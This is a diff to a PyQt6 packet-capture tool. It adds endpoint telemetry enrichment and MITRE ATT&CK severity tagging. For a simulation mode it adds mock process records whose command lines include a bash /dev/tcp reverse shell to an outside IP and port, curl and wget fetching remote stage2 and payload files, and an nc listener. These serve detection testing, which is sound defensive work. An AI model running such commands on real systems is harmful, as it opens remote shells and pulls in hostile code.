@@ -7,6 +7,8 @@ from PyQt6.QtCore import QThread, pyqtSignal
 
 from app.config import config
 from app.core.parser import PacketDissector, format_hex_dump, calculate_payload_hash
+from app.core.telemetry_enricher import telemetry_enricher
+from app.core.secops_engine import evaluate_heuristics, compute_severity
 
 
 def get_available_interfaces() -> List[str]:
@@ -60,6 +62,53 @@ def sanitize_bpf_filter(raw_bpf: str) -> str:
         return f"host {raw_bpf.strip()}"
     
     return raw_bpf.strip()
+
+
+def enrich_packet_with_telemetry(pkt_dict: dict) -> dict:
+    """
+    Enrich a parsed packet dict with endpoint telemetry (process correlation)
+    and MITRE ATT&CK heuristic tags for EDR functionality.
+    """
+    try:
+        src_port = int(pkt_dict.get("src_port") or 0)
+        dst_ip = pkt_dict.get("dst", "")
+        dst_port = int(pkt_dict.get("dst_port") or 0)
+    except (ValueError, TypeError):
+        src_port, dst_ip, dst_port = 0, "", 0
+
+    # Correlate socket to process
+    process_data = {}
+    if src_port > 0:
+        try:
+            process_data = telemetry_enricher.correlate_socket(src_port, dst_ip, dst_port)
+        except Exception:
+            pass
+
+    # Inject process fields into packet dict
+    pkt_dict["pid"] = process_data.get("pid", "")
+    pkt_dict["ppid"] = process_data.get("ppid", "")
+    pkt_dict["process_name"] = process_data.get("name", "")
+    pkt_dict["cmdline"] = process_data.get("cmdline", "")
+    pkt_dict["username"] = process_data.get("username", "")
+    pkt_dict["exe_path"] = process_data.get("exe_path", "")
+    pkt_dict["exe_sha256"] = process_data.get("sha256", "")
+
+    # Evaluate MITRE ATT&CK heuristics
+    mitre_tags = []
+    try:
+        mitre_tags = evaluate_heuristics(process_data, pkt_dict)
+    except Exception:
+        pass
+    pkt_dict["mitre_tags"] = mitre_tags
+
+    # Compute severity
+    threat_data = pkt_dict.get("threat_data") or {}
+    try:
+        pkt_dict["severity"] = compute_severity(threat_data, mitre_tags, process_data)
+    except Exception:
+        pkt_dict["severity"] = "safe"
+
+    return pkt_dict
 
 
 class LiveCaptureThread(QThread):
@@ -211,6 +260,7 @@ class LiveCaptureThread(QThread):
                             if "_source" in pkt_data:
                                 self._packet_count += 1
                                 parsed_pkt = PacketDissector.dissect_tshark_json_packet(pkt_data, self._packet_count)
+                                enrich_packet_with_telemetry(parsed_pkt)
                                 packet_batch.append(parsed_pkt)
                                 self.packet_received.emit(parsed_pkt)
 
@@ -331,10 +381,24 @@ class LiveCaptureThread(QThread):
             ("8.8.4.4", "Google DNS Secondary", "UDP"),
             ("1.0.0.1", "Cloudflare DNS Secondary", "UDP"),
             ("208.67.222.222", "OpenDNS", "UDP"),
+            ("91.92.109.198", "C2 Server", "TCP"),
         ]
 
         internal_ips = ["192.168.1.105", "192.168.1.1", "10.0.0.15", "172.16.0.4"]
         methods = ["GET /index.html", "POST /api/login", "GET /favicon.ico", "CONNECT gateway:443"]
+
+        # Mock process data for EDR simulation
+        mock_processes = [
+            {"pid": 4821, "ppid": 1024, "name": "curl", "cmdline": "curl -s http://185.220.101.5/stage2.sh", "username": "root", "exe_path": "/usr/bin/curl"},
+            {"pid": 1832, "ppid": 981, "name": "python3", "cmdline": "python3 -c \"import socket,subprocess,os;...\"", "username": "root", "exe_path": "/usr/bin/python3"},
+            {"pid": 981, "ppid": 1, "name": "chrome", "cmdline": "/opt/google/chrome/chrome --type=renderer", "username": "user", "exe_path": "/opt/google/chrome/chrome"},
+            {"pid": 2100, "ppid": 1024, "name": "ssh", "cmdline": "ssh -o StrictHostKeyChecking=no 10.0.0.1", "username": "user", "exe_path": "/usr/bin/ssh"},
+            {"pid": 5501, "ppid": 1024, "name": "wget", "cmdline": "wget -q http://cdn.example.com/payload.bin", "username": "root", "exe_path": "/usr/bin/wget"},
+            {"pid": 450, "ppid": 1, "name": "systemd-resolved", "cmdline": "/usr/lib/systemd/systemd-resolved", "username": "systemd-resolve", "exe_path": "/usr/lib/systemd/systemd-resolved"},
+            {"pid": 3304, "ppid": 1024, "name": "bash", "cmdline": "bash -i >& /dev/tcp/91.92.109.198/4444 0>&1", "username": "root", "exe_path": "/usr/bin/bash"},
+            {"pid": 672, "ppid": 1, "name": "nginx", "cmdline": "nginx: worker process", "username": "www-data", "exe_path": "/usr/sbin/nginx"},
+            {"pid": 7711, "ppid": 3304, "name": "nc", "cmdline": "nc -lvp 9001", "username": "root", "exe_path": "/usr/bin/nc"},
+        ]
 
         packet_batch = []
         last_flush = time.time()
@@ -435,6 +499,26 @@ class LiveCaptureThread(QThread):
                 "threat_score": 0,
                 "threat_data": None
             }
+
+            # EDR: Inject mock process telemetry
+            mock_proc = random.choice(mock_processes)
+            pkt_dict["pid"] = mock_proc["pid"]
+            pkt_dict["ppid"] = mock_proc["ppid"]
+            pkt_dict["process_name"] = mock_proc["name"]
+            pkt_dict["cmdline"] = mock_proc["cmdline"]
+            pkt_dict["username"] = mock_proc["username"]
+            pkt_dict["exe_path"] = mock_proc["exe_path"]
+            pkt_dict["exe_sha256"] = hashes["sha256"]  # reuse payload hash for demo
+
+            # Evaluate MITRE heuristics on mock data
+            try:
+                process_data = {"name": mock_proc["name"], "pid": mock_proc["pid"]}
+                mitre_tags = evaluate_heuristics(process_data, pkt_dict)
+                pkt_dict["mitre_tags"] = mitre_tags
+                pkt_dict["severity"] = compute_severity({}, mitre_tags, process_data)
+            except Exception:
+                pkt_dict["mitre_tags"] = []
+                pkt_dict["severity"] = "safe"
 
             packet_batch.append(pkt_dict)
             self.packet_received.emit(pkt_dict)
